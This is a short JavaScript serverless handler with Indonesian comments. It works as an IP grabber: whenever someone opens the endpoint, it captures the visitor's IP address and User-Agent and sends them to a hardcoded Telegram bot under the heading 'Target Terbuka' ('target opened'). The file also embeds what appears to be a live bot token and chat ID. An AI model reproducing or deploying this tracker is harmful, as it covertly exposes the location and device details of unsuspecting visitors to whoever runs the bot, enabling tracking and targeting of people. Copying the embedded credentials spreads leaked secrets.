export default async function handler(req, res) {
  // Hardcode bot token & chat id (ganti dengan punyamu)
  const token = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY";
  const chatId = "7600526426"; // ganti dengan chat_id asli kamu

  // Ambil IP & User-Agent
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "Unknown";
  const ua = req.headers["user-agent"] || "-";

  // Pesan ke Telegram
  const text = `📡 Target Terbuka\n\n🌐 IP: ${ip}\n🛰 User-Agent: ${ua}`;

  try {
    const tg = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });

    const result = await tg.json();
    console.log("Telegram Response:", result);

    res.status(200).json({ success: true, sent: result });
  } catch (err) {
    console.error("Error sending to Telegram:", err);
    res.status(500).json({ success: false, error: err.message });
  }
}
